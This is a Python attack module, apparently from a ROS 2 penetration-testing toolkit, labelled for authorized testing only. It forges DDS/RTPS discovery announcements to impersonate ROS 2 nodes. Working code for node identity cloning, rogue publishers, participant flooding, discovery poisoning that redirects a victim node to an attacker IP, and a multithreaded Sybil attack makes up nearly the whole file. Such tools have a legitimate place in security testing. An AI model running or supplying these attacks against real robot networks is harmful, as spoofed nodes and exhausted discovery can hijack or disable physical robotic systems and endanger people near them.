#!/usr/bin/env python3
"""
node_impersonation.py — Rogue DDS Participant / ROS 2 Node Impersonation
==========================================================================
Creates fake DDS participants that impersonate legitimate ROS 2 nodes.

Attack capabilities:
1. Shadow Node:     Clone a discovered node's identity (name, namespace, GUID)
2. Rogue Publisher: Create a fake publisher on any topic with arbitrary data
3. Rogue Service:   Register fake service servers to intercept service calls
4. Participant Flood: Create many fake participants to exhaust discovery resources
5. Discovery Poisoning: Inject malicious SPDP announcements

These attacks exploit the trust-by-default model of DDS without DDS-Security.
When SROS2 is disabled, any device on the network can join the DDS domain
and claim to be any participant — there is no authentication.

⚠️  AUTHORIZED SECURITY TESTING ONLY ⚠️

Author: Gh057x
"""

import struct
import socket
import time
import random
import os
import json
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

from core.rtps_parser import (
    RTPSParser, DDSParticipant, DDSPortCalculator, RTPSLocator,
    RTPS_MAGIC, VendorId, SubmessageKind, ParameterId,
    ENTITYID_SPDP_BUILTIN_WRITER, ENTITYID_PARTICIPANT,
)
from core.rtps_scanner import SPDPProbeBuilder


# =============================================================================
# Impersonation Types
# =============================================================================

class ImpersonationType(str, Enum):
    SHADOW_NODE = "shadow_node"
    ROGUE_PUBLISHER = "rogue_publisher"
    ROGUE_SERVICE = "rogue_service"
    PARTICIPANT_FLOOD = "participant_flood"
    DISCOVERY_POISON = "discovery_poison"


@dataclass
class RogueIdentity:
    """Identity for a rogue DDS participant"""
    participant_name: str = ""
    namespace: str = ""
    guid_prefix: bytes = field(default_factory=lambda: os.urandom(12))
    vendor_id: int = 0x010F           # Masquerade as Fast DDS
    domain_id: int = 0
    hostname: str = ""
    username: str = ""
    process_name: str = ""
    topics_publish: List[str] = field(default_factory=list)
    topics_subscribe: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict:
        return {
            "participant_name": self.participant_name,
            "namespace": self.namespace,
            "guid_prefix": self.guid_prefix.hex(),
            "vendor_id": f"0x{self.vendor_id:04X}",
            "domain_id": self.domain_id,
            "hostname": self.hostname,
            "topics_pub": self.topics_publish,
            "topics_sub": self.topics_subscribe,
        }


@dataclass
class ImpersonationResult:
    """Results of an impersonation attack"""
    attack_type: str
    identity: Dict
    start_time: str
    end_time: str = ""
    announcements_sent: int = 0
    participants_created: int = 0
    success: bool = False
    notes: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict:
        return {
            "attack_type": self.attack_type,
            "identity": self.identity,
            "start_time": self.start_time,
            "end_time": self.end_time,
            "announcements_sent": self.announcements_sent,
            "participants_created": self.participants_created,
            "success": self.success,
            "notes": self.notes,
        }


# =============================================================================
# SPDP Announcement Builder (Extended)
# =============================================================================

class SPDPAnnouncementBuilder:
    """
    Builds SPDP announcement packets with full control over
    participant identity, properties, and endpoint claims.
    """

    @classmethod
    def build_announcement(cls, identity: RogueIdentity,
                            source_ip: str = "0.0.0.0",
                            source_port: int = 7411) -> bytes:
        # RTPS Header
        packet = RTPS_MAGIC
        packet += bytes([2, 4])
        packet += struct.pack('!H', identity.vendor_id)
        packet += identity.guid_prefix

        # INFO_TS
        now = time.time()
        ts_payload = struct.pack('<II', int(now),
                                 int((now - int(now)) * (2**32)))
        packet += bytes([SubmessageKind.INFO_TS, 0x01])
        packet += struct.pack('<H', len(ts_payload))
        packet += ts_payload

        # DATA with participant data
        participant_data = cls._build_participant_data(
            identity, source_ip, source_port
        )

        data_payload = struct.pack('<H', 0x0000)               # Extra flags
        data_payload += struct.pack('<H', 16)                    # Octets to inline QoS
        data_payload += bytes([0x00, 0x00, 0x00, 0x00])         # Reader: unknown
        data_payload += ENTITYID_SPDP_BUILTIN_WRITER
        data_payload += struct.pack('<II', 0, random.randint(1, 65535))
        data_payload += b'\x00\x01\x00\x00'                     # CDR LE
        data_payload += participant_data

        packet += bytes([SubmessageKind.DATA, 0x05])
        packet += struct.pack('<H', len(data_payload))
        packet += data_payload

        return packet

    @classmethod
    def _build_participant_data(cls, identity: RogueIdentity,
                                  source_ip: str, source_port: int) -> bytes:
        params = b''

        # Protocol version
        params += cls._param(ParameterId.PID_PROTOCOL_VERSION,
                              bytes([2, 4, 0, 0]))

        # Vendor ID
        params += cls._param(ParameterId.PID_VENDOR_ID,
                              struct.pack('!H', identity.vendor_id) + b'\x00\x00')

        # Lease duration
        params += cls._param(ParameterId.PID_PARTICIPANT_LEASE_DURATION,
                              struct.pack('<II', 100, 0))

        # Builtin endpoint set (claim all standard endpoints)
        endpoint_set = 0x000000FF
        params += cls._param(ParameterId.PID_BUILTIN_ENDPOINT_SET,
                              struct.pack('<I', endpoint_set))

        # Unicast locator
        if source_ip and source_ip != "0.0.0.0":
            locator = cls._build_locator(source_ip, source_port)
            params += cls._param(ParameterId.PID_DEFAULT_UNICAST_LOCATOR, locator)

            meta_port = DDSPortCalculator.discovery_unicast(identity.domain_id, 0)
            meta_locator = cls._build_locator(source_ip, meta_port)
            params += cls._param(ParameterId.PID_METATRAFFIC_UNICAST_LOCATOR,
                                  meta_locator)

        # Entity name (ROS 2 node identity)
        if identity.participant_name:
            name_bytes = identity.participant_name.encode('utf-8') + b'\x00'
            name_param = struct.pack('<I', len(name_bytes)) + name_bytes
            padding = (4 - len(name_bytes) % 4) % 4
            name_param += b'\x00' * padding
            params += cls._param(ParameterId.PID_ENTITY_NAME, name_param)

        # Properties (hostname, username, process)
        properties = {}
        if identity.hostname:
            properties["fastdds.physical_data.host"] = identity.hostname
        if identity.username:
            properties["fastdds.physical_data.user"] = identity.username
        if identity.process_name:
            properties["fastdds.physical_data.process"] = identity.process_name
        if identity.namespace:
            properties["ros.namespace"] = identity.namespace

        if properties:
            prop_data = cls._build_property_list(properties)
            params += cls._param(ParameterId.PID_PROPERTY_LIST, prop_data)

        # Sentinel
        params += struct.pack('<HH', 0x0001, 0)
        return params

    @classmethod
    def _build_locator(cls, ip: str, port: int, kind: int = 1) -> bytes:
        data = struct.pack('<I', kind)
        data += struct.pack('<I', port)
        data += b'\x00' * 12
        data += socket.inet_aton(ip)
        return data

    @classmethod
    def _build_property_list(cls, properties: Dict[str, str]) -> bytes:
        data = struct.pack('<I', len(properties))
        for key, value in properties.items():
            for s in (key, value):
                s_bytes = s.encode('utf-8') + b'\x00'
                data += struct.pack('<I', len(s_bytes)) + s_bytes
                data += b'\x00' * ((4 - len(s_bytes) % 4) % 4)
        return data

    @classmethod
    def _param(cls, pid: int, value: bytes) -> bytes:
        padded_len = len(value) + (4 - len(value) % 4) % 4
        data = struct.pack('<HH', pid, padded_len)
        data += value + b'\x00' * (padded_len - len(value))
        return data


# =============================================================================
# Node Impersonator
# =============================================================================

class NodeImpersonator:
    """Main impersonation engine."""

    def __init__(self, target_node_name: str = "", namespace: str = "",
                 domain_id: int = 0, verbose: bool = False):
        self.verbose = verbose
        self.target_node_name = target_node_name
        self.namespace = namespace
        self.domain_id = domain_id
        self._attack_log: List[ImpersonationResult] = []

    def shadow_node(self, target: DDSParticipant, domain_id: int = 0,
                     source_ip: str = "0.0.0.0", duration: float = 60.0,
                     announce_rate: float = 2.0) -> ImpersonationResult:
        """Clone a discovered participant's identity and announce as it."""
        identity = self.clone_identity(target)
        self._log(f"Shadowing: {identity.participant_name} "
                  f"(GUID: {identity.guid_prefix.hex()})")
        return self._announce_loop(identity, source_ip, domain_id,
                                    duration, announce_rate,
                                    ImpersonationType.SHADOW_NODE)

    def rogue_publisher(self, name: str, topics: List[str],
                         domain_id: int = 0, source_ip: str = "0.0.0.0",
                         duration: float = 60.0,
                         hostname: str = "legitimate-controller",
                         username: str = "ros") -> ImpersonationResult:
        """Create a fake participant claiming to publish on specified topics."""
        identity = RogueIdentity(
            participant_name=name, guid_prefix=os.urandom(12),
            domain_id=domain_id, hostname=hostname, username=username,
            process_name=name.split("/")[-1], topics_publish=topics,
        )
        self._log(f"Rogue publisher: {name} → {', '.join(topics)}")
        return self._announce_loop(identity, source_ip, domain_id,
                                    duration, 2.0,
                                    ImpersonationType.ROGUE_PUBLISHER)

    def participant_flood(self, domain_id: int = 0, count: int = 100,
                           source_ip: str = "0.0.0.0",
                           name_prefix: str = "/flood_node_") -> ImpersonationResult:
        """Flood DDS domain with fake participant announcements."""
        result = ImpersonationResult(
            attack_type=ImpersonationType.PARTICIPANT_FLOOD.value,
            identity={"prefix": name_prefix, "count": count},
            start_time=datetime.now().isoformat(),
        )

        mc_port = DDSPortCalculator.discovery_multicast(domain_id)
        self._log(f"Flooding domain {domain_id} with {count} fake participants")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM,
                                 socket.IPPROTO_UDP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)

            for i in range(count):
                identity = RogueIdentity(
                    participant_name=f"{name_prefix}{i:04d}",
                    guid_prefix=os.urandom(12),
                    domain_id=domain_id,
                    hostname=f"node-{i:04d}", username="ros",
                )
                packet = SPDPAnnouncementBuilder.build_announcement(
                    identity, source_ip=source_ip
                )
                sock.sendto(packet, ("239.255.0.1", mc_port))
                result.announcements_sent += 1
                result.participants_created += 1

                if self.verbose and (i + 1) % 10 == 0:
                    print(f"  [{i+1}/{count}] announced")
                time.sleep(0.01)

            sock.close()
        except Exception as e:
            result.notes.append(f"Error: {e}")

        result.end_time = datetime.now().isoformat()
        result.success = result.participants_created > 0
        self._attack_log.append(result)
        return result

    def discovery_poison(self, victim_name: str, redirect_ip: str,
                          redirect_port: int = 7411, domain_id: int = 0,
                          source_ip: str = "0.0.0.0",
                          duration: float = 60.0) -> ImpersonationResult:
        """Announce fake participant with victim's name pointing to attacker IP."""
        identity = RogueIdentity(
            participant_name=victim_name,
            guid_prefix=os.urandom(12),
            domain_id=domain_id,
        )
        self._log(f"Poisoning discovery: {victim_name} → {redirect_ip}:{redirect_port}")
        return self._announce_loop(
            identity, source_ip=redirect_ip, domain_id=domain_id,
            duration=duration, announce_rate=5.0,
            attack_type=ImpersonationType.DISCOVERY_POISON,
        )

    def _announce_loop(self, identity: RogueIdentity,
                        source_ip: str, domain_id: int,
                        duration: float, announce_rate: float,
                        attack_type: ImpersonationType) -> ImpersonationResult:
        result = ImpersonationResult(
            attack_type=attack_type.value,
            identity=identity.to_dict(),
            start_time=datetime.now().isoformat(),
        )

        mc_port = DDSPortCalculator.discovery_multicast(domain_id)
        interval = 1.0 / announce_rate
        deadline = time.time() + duration

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM,
                                 socket.IPPROTO_UDP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)

            while time.time() < deadline:
                packet = SPDPAnnouncementBuilder.build_announcement(
                    identity, source_ip=source_ip
                )
                sock.sendto(packet, ("239.255.0.1", mc_port))
                result.announcements_sent += 1
                if result.announcements_sent == 1:
                    result.participants_created = 1
                time.sleep(interval)

            sock.close()
        except Exception as e:
            result.notes.append(f"Error: {e}")

        result.end_time = datetime.now().isoformat()
        result.success = result.announcements_sent > 0
        self._attack_log.append(result)
        return result

    @staticmethod
    def sybil_attack(namespace: str = "/robot1", num_clones: int = 20,
                     domain_id: int = 0, duration: float = 60.0,
                     verbose: bool = False) -> List["ImpersonationResult"]:
        """
        Sybil attack: spawn num_clones fake participants all claiming to exist
        in namespace, announced concurrently for duration seconds.

        Each clone gets a unique GUID and name, e.g. /robot1/sybil_node_0001.
        Saturates the domain's participant table and confuses node discovery.
        """
        mc_port = DDSPortCalculator.discovery_multicast(domain_id)
        results: List[ImpersonationResult] = []

        def _run_clone(idx: int) -> ImpersonationResult:
            identity = RogueIdentity(
                participant_name=f"{namespace}/sybil_node_{idx:04d}",
                namespace=namespace,
                guid_prefix=os.urandom(12),
                domain_id=domain_id,
                hostname=f"sybil-{idx:04d}",
                username="ros",
                process_name=f"sybil_node_{idx:04d}",
            )
            result = ImpersonationResult(
                attack_type=ImpersonationType.PARTICIPANT_FLOOD.value,
                identity=identity.to_dict(),
                start_time=datetime.now().isoformat(),
            )
            interval = 0.5  # announce at 2 Hz per clone
            deadline = time.time() + duration
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM,
                                     socket.IPPROTO_UDP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
                while time.time() < deadline:
                    packet = SPDPAnnouncementBuilder.build_announcement(identity)
                    sock.sendto(packet, ("239.255.0.1", mc_port))
                    result.announcements_sent += 1
                    if result.announcements_sent == 1:
                        result.participants_created = 1
                    time.sleep(interval)
                sock.close()
            except Exception as e:
                result.notes.append(f"Error: {e}")
            result.end_time = datetime.now().isoformat()
            result.success = result.announcements_sent > 0
            if verbose:
                print(f"  [sybil_{idx:04d}] {result.announcements_sent} announcements sent")
            return result

        if verbose:
            print(f"[*] Sybil attack: {num_clones} clones in {namespace} "
                  f"(domain {domain_id}) for {duration}s")

        with ThreadPoolExecutor(max_workers=min(num_clones, 50)) as executor:
            futures = [executor.submit(_run_clone, i) for i in range(num_clones)]
            results = [f.result() for f in futures]

        return results

    @staticmethod
    def clone_identity(participant: DDSParticipant) -> RogueIdentity:
        """Create a RogueIdentity by cloning a discovered participant"""
        identity = RogueIdentity(
            participant_name=participant.participant_name or "",
            guid_prefix=participant.guid_prefix,
            vendor_id=participant.vendor_id,
            domain_id=participant.domain_id or 0,
        )
        for key, value in participant.properties.items():
            if "host" in key.lower():
                identity.hostname = value
            elif "user" in key.lower():
                identity.username = value
            elif "process" in key.lower():
                identity.process_name = value
        return identity

    def get_attack_log(self) -> List[Dict]:
        return [r.to_dict() for r in self._attack_log]

    def _log(self, msg: str, level: str = "INFO"):
        if self.verbose or level in ("WARNING", "ERROR"):
            print(f"[{level}] {msg}")


def print_impersonation_result(result: ImpersonationResult):
    status = "\033[92m✓ SUCCESS\033[0m" if result.success else "\033[91m✗ FAILED\033[0m"
    print(f"\n{'─' * 55}")
    print(f"  Impersonation: {result.attack_type}")
    print(f"  Status:        {status}")
    print(f"  Announcements: {result.announcements_sent:,}")
    print(f"  Participants:  {result.participants_created}")
    if isinstance(result.identity, dict) and result.identity.get("participant_name"):
        print(f"  Identity:      {result.identity['participant_name']}")
    if result.notes:
        for note in result.notes:
            print(f"    - {note}")
    print(f"{'─' * 55}\n")
